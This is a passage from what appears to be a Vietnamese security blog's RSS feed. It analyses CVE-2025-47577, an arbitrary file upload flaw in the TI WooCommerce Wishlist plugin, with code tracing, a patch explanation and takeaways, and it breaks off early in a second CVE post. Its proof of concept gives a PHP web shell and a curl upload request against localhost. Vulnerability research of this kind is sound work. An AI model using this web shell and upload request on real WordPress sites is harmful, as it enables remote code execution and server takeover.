&amp;#39;application/vnd.oasis.opendocument.presentation&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;ods&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.spreadsheet&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odg&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.graphics&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odc&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.chart&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odb&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.database&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;odf&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.oasis.opendocument.formula&amp;#39;,&#xA;&#x9;&#x9;&#x9;// WordPerfect formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;wp|wpd&amp;#39;                       =&amp;gt; &amp;#39;application/wordperfect&amp;#39;,&#xA;&#x9;&#x9;&#x9;// iWork formats.&#xA;&#x9;&#x9;&#x9;&amp;#39;key&amp;#39;                          =&amp;gt; &amp;#39;application/vnd.apple.keynote&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;numbers&amp;#39;                      =&amp;gt; &amp;#39;application/vnd.apple.numbers&amp;#39;,&#xA;&#x9;&#x9;&#x9;&amp;#39;pages&amp;#39;                        =&amp;gt; &amp;#39;application/vnd.apple.pages&amp;#39;,&#xA;&#x9;&#x9;)&#xA;&#x9;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;👉 Đã tìm ra đáp án cho câu hỏi thứ 2&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;code&gt;tinvwl_upload_file_wc_fields_factory()&lt;/code&gt; được gọi trong hàm &lt;code&gt;tinvwl_meta_wc_fields_factory()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function tinvwl_meta_wc_fields_factory( $meta, $post, $files ) {&#xA;&#x9;if ( function_exists( &amp;#39;wcff&amp;#39; ) ) {&#xA;&#x9;&#x9;foreach ( $files as $name =&amp;gt; $file ) {&#xA;&#x9;&#x9;&#x9;if ( array_key_exists( $name, $meta ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$upload = tinvwl_upload_file_wc_fields_factory( $file );&#xA;&#x9;&#x9;&#x9;&#x9;if ( empty( $upload[&amp;#39;error&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $upload[&amp;#39;file&amp;#39;] ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;$file[&amp;#39;tmp_name&amp;#39;] = $upload[&amp;#39;file&amp;#39;];&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;$meta[ $name ]    = json_encode( array_merge( $upload, $file ) );&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;return $meta;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chỉ chạy nếu plugin &lt;strong&gt;WC Fields Factory (wcff)&lt;/strong&gt; đang được kích hoạt - vì plugin này định nghĩa hàm &lt;code&gt;wcff()&lt;/code&gt;, khi tìm với từ khóa &lt;code&gt;function wcff(&lt;/code&gt; trong thư mục chứa các plugin&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-07-cve-2025-47577/wcff.png&#34; title=&#34;Nơi wcff() được tạo&#34; data-thumbnail=&#34;/posts/2025-11-07-cve-2025-47577/wcff.png&#34; data-sub-html=&#34;&lt;h2&gt;wcff&lt;/h2&gt;&lt;p&gt;Nơi wcff() được tạo&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-07-cve-2025-47577/wcff.png&#39; alt=&#34;wcff&#34; height=&#34;407&#34; width=&#34;1220&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nơi wcff() được tạo&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta thấy được nơi hàm &lt;code&gt;wcff()&lt;/code&gt; được tạo là plugin &lt;strong&gt;WC Fields Factory (wcff)&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( array_key_exists( $name, $meta ) ) { ... }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chỉ xử lý nếu tên file (&lt;code&gt;$name&lt;/code&gt;) trùng với một key trong &lt;code&gt;$meta&lt;/code&gt; (tức là trường form hợp lệ).&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$upload = tinvwl_upload_file_wc_fields_factory( $file );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gọi hàm &lt;code&gt;tinvwl_upload_file_wc_fields_factory()&lt;/code&gt; để upload file lên server&lt;/p&gt;&#xA;&lt;p&gt;Hàm &lt;code&gt;tinvwl_meta_wc_fields_factory()&lt;/code&gt; được đăng ký làm callback cho filter&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_filter( &amp;#39;tinvwl_addtowishlist_prepare_form&amp;#39;, &amp;#39;tinvwl_meta_wc_fields_factory&amp;#39;, 10, 3 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Có nghĩa là, nếu trong mã nguồn &lt;code&gt;apply_filters( &#39;tinvwl_addtowishlist_prepare_form&#39;,...)&lt;/code&gt; thì &lt;code&gt;tinvwl_meta_wc_fields_factory()&lt;/code&gt; được gọi.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;tinvwl_addtowishlist_prepare_form&lt;/code&gt; được apply trong hàm &lt;code&gt;add_to_wishlist()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function add_to_wishlist() {&#xA;    if ( is_null( filter_input( INPUT_POST, &amp;#39;tinv_wishlist_id&amp;#39; ) ) ) {&#xA;        return false;&#xA;    } else {&#xA;        remove_action( &amp;#39;init&amp;#39;, &amp;#39;woocommerce_add_to_cart_action&amp;#39; );&#xA;        remove_action( &amp;#39;wp_loaded&amp;#39;, &amp;#39;WC_Form_Handler::add_to_cart_action&amp;#39;, 20 );&#xA;    }&#xA;    ob_start();&#xA;    $post = filter_input_array( INPUT_POST, array(&#xA;        &amp;#39;tinv_wishlist_id&amp;#39;   =&amp;gt; FILTER_VALIDATE_INT,&#xA;        &amp;#39;tinv_wishlist_name&amp;#39; =&amp;gt; FILTER_SANITIZE_FULL_SPECIAL_CHARS,&#xA;        &amp;#39;product_id&amp;#39;         =&amp;gt; FILTER_VALIDATE_INT,&#xA;        &amp;#39;product_variation&amp;#39;  =&amp;gt; FILTER_VALIDATE_INT,&#xA;        &amp;#39;product_type&amp;#39;       =&amp;gt; FILTER_SANITIZE_FULL_SPECIAL_CHARS,&#xA;        &amp;#39;product_action&amp;#39;     =&amp;gt; FILTER_SANITIZE_FULL_SPECIAL_CHARS,&#xA;        &amp;#39;redirect&amp;#39;           =&amp;gt; FILTER_SANITIZE_URL,&#xA;    ) );&#xA;&#xA;    $post[&amp;#39;original_product_id&amp;#39;] = $post[&amp;#39;product_id&amp;#39;];&#xA;&#xA;    $wlp      = null;&#xA;    $wishlist = null;&#xA;    $data     = array( &amp;#39;msg&amp;#39; =&amp;gt; array() );&#xA;    ...&#xA;&#xA;    $status = true;&#xA;    if ( empty( $post[&amp;#39;product_id&amp;#39;] ) || apply_filters( &amp;#39;tinvwl_addtowishlist_not_allowed&amp;#39;, false, $post ) ) {&#xA;        $status        = false;&#xA;        $data[&amp;#39;msg&amp;#39;][] = __( &amp;#39;Something went wrong&amp;#39;, &amp;#39;ti-woocommerce-wishlist&amp;#39; );&#xA;    } else {&#xA;        $post[&amp;#39;product_type&amp;#39;] = apply_filters( &amp;#39;tinvwl_addtowishlist_modify_type&amp;#39;, $post[&amp;#39;product_type&amp;#39;], $post );&#xA;        $post                 = apply_filters( &amp;#39;tinvwl_addtowishlist_prepare&amp;#39;, $post );&#xA;        $form                 = apply_filters( &amp;#39;tinvwl_addtowishlist_prepare_form&amp;#39;, filter_input( INPUT_POST, &amp;#39;form&amp;#39;, FILTER_DEFAULT, FILTER_FORCE_ARRAY ), $_POST, $_FILES );&#xA;        ...&#xA;    } &#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều kiện cần để logic apply được gọi là:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;POST method gồm các tham số &lt;code&gt;tinv_wishlist_id&lt;/code&gt; tồn tại.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;product_id&lt;/code&gt; tồn tại và filter &lt;code&gt;tinvwl_addtowishlist_not_allowed&lt;/code&gt; luôn &lt;code&gt;false&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Filter &lt;code&gt;tinvwl_addtowishlist_not_allowed&lt;/code&gt; mặc định sẽ trả về &lt;code&gt;false&lt;/code&gt; vì khi search, tôi không thấy vị trí nào apply để thay đổi giá trị của nó.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-07-cve-2025-47577/filter.png&#34; title=&#34;tinvwl_addtowishlist_not_allowed luôn false&#34; data-thumbnail=&#34;/posts/2025-11-07-cve-2025-47577/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;tinvwl_addtowishlist_not_allowed luôn false&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-07-cve-2025-47577/filter.png&#39; alt=&#34;Filter&#34; height=&#34;330&#34; width=&#34;1689&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;tinvwl_addtowishlist_not_allowed luôn false&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;add_to_wishlist()&lt;/code&gt; được đăng ký làm callback cho action hook&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_loaded&amp;#39;, array( $this, &amp;#39;add_to_wishlist&amp;#39; ), 0 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tức sẽ gọi &lt;code&gt;add_to_wishlist&lt;/code&gt; trên mỗi request.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;  A[&amp;#34;HTTP POST (tinv_wishlist_id, product_id, form[...] &amp;#43; file)&amp;#34;] --&amp;gt; B[&amp;#34;wp_loaded → add_to_wishlist()&amp;#34;]&#xA;  B --&amp;gt; C[&amp;#34;apply_filters(&amp;#39;tinvwl_addtowishlist_prepare_form&amp;#39;, $_POST[&amp;#39;form&amp;#39;], $_POST, $_FILES)&amp;#34;]&#xA;  C --&amp;gt; D[&amp;#34;tinvwl_meta_wc_fields_factory($meta, $post, $files)&amp;#34;]&#xA;  D --&amp;gt; E[&amp;#34;foreach $files as $name =&amp;gt; $file&amp;#34;]&#xA;  E --&amp;gt; F[&amp;#34;if array_key_exists($name, $meta)&amp;#34;]&#xA;  F --&amp;gt; G[&amp;#34;tinvwl_upload_file_wc_fields_factory($file)&amp;#34;]&#xA;  G --&amp;gt; H[&amp;#34;wp_handle_upload($file, [&amp;#39;test_form&amp;#39;=&amp;gt;false, &amp;#39;test_type&amp;#39;=&amp;gt;false])&amp;#34;]&#xA;  H --&amp;gt; I[&amp;#34;_wp_handle_upload() — MIME checks skipped&amp;#34;]&#xA;  I --&amp;gt; J[&amp;#34;File written to /wp-content/uploads → possible RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo file &lt;code&gt;.php&lt;/code&gt; chứa web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]) ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Gửi POST request&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -X POST &amp;#34;http://localhost&amp;#34; -F &amp;#34;tinv_wishlist_id=1&amp;#34; -F &amp;#34;product_id=1&amp;#34; -F &amp;#34;form[image]=1&amp;#34; -F &amp;#34;image=@rce.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;RCE với file upload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-07-cve-2025-47577/result.png&#34; title=&#34;RCE với file upload&#34; data-thumbnail=&#34;/posts/2025-11-07-cve-2025-47577/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE với file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-07-cve-2025-47577/result.png&#39; alt=&#34;Result&#34; height=&#34;348&#34; width=&#34;559&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE với file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-47577&lt;/strong&gt; bắt nguồn từ việc &lt;strong&gt;vô hiệu hóa kiểm tra MIME type (&lt;code&gt;test_type =&amp;gt; false&lt;/code&gt;)&lt;/strong&gt; trong hàm &lt;code&gt;wp_handle_upload()&lt;/code&gt;, cho phép kẻ tấn công tải lên bất kỳ tệp nào, bao gồm &lt;strong&gt;mã PHP độc hại&lt;/strong&gt;. Khi file được tải lên thư mục &lt;code&gt;/wp-content/uploads/&lt;/code&gt;, nó có thể được truy cập trực tiếp để thực thi mã từ xa (RCE).&#xA;Bản vá 2.10.0 đã khắc phục bằng cách bật lại kiểm tra MIME, đảm bảo chỉ những loại file hợp lệ trong danh sách whitelist của WordPress mới được phép upload.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Luôn duy trì &lt;strong&gt;kiểm tra MIME type&lt;/strong&gt; và &lt;strong&gt;phần mở rộng file&lt;/strong&gt; khi xử lý upload.&lt;/li&gt;&#xA;&lt;li&gt;Không nên &lt;strong&gt;ghi đè các cơ chế bảo mật mặc định&lt;/strong&gt; của WordPress như &lt;code&gt;test_type&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Khi phân tích lỗ hổng, việc &lt;strong&gt;so sánh patch diff&lt;/strong&gt; giúp nhanh chóng nhận diện nguyên nhân gốc (root cause).&lt;/li&gt;&#xA;&lt;li&gt;Nhà phát triển plugin cần thường xuyên &lt;strong&gt;kiểm tra các hook và filter liên quan đến upload&lt;/strong&gt; để tránh rủi ro RCE.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ti-woocommerce-wishlist/vulnerability/wordpress-ti-woocommerce-wishlist-2-9-2-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TI WooCommerce Wishlist Plugin &amp;lt;= 2.9.2 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10647 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-06-cve-2025-10647/</link>
      <pubDate>Thu, 06 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-06-cve-2025-10647/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-06-cve-2025-10647/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Embed PDF for WPForms&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; bị lỗ hổng cho phép &lt;strong&gt;arbitrary file uploads&lt;/strong&gt; do thiếu kiểm tra loại file trong hàm &lt;code&gt;ajax_handler_download_pdf_media&lt;/code&gt; ở tất cả các phiên bản đến và bao gồm &lt;strong&gt;1.1.5&lt;/strong&gt;. Điều này cho phép kẻ tấn công đã xác thực, với quyền truy cập từ mức &lt;strong&gt;Subscriber&lt;/strong&gt; trở lên, tải lên các file tùy ý lên server của site bị ảnh hưởng, và có thể dẫn đến &lt;strong&gt;remote code execution&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10647&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10647&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.1.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Subscriber&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/embed-pdf-wpforms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed PDF for WPForms Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 